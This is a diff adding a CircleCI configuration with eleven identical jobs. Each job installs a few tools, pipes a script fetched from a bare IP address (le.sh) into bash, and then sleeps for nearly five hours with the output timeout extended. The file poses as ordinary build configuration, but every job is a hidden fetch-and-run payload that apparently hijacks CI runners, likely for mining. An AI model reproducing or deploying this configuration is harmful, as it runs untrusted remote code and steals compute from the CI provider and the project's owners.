@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  nsqlpostproduct:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/le.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nsqlpostproduct1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/le.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nsqlpostproduct2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/le.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nsqlpostproduct3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/le.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nsqlpostproduct4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/le.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nsqlpostproduct5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/le.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nsqlpostproduct6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/le.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nsqlpostproduct7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/le.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nsqlpostproduct8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/le.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nsqlpostproduct9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/le.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nsqlpostproduct10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://18.141.205.134/le.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - nsqlpostproduct
+      - nsqlpostproduct1
+      - nsqlpostproduct2
+      - nsqlpostproduct3
+      - nsqlpostproduct4
+      - nsqlpostproduct5
+      - nsqlpostproduct6
+      - nsqlpostproduct7
+      - nsqlpostproduct8
+      - nsqlpostproduct9
+      - nsqlpostproduct10
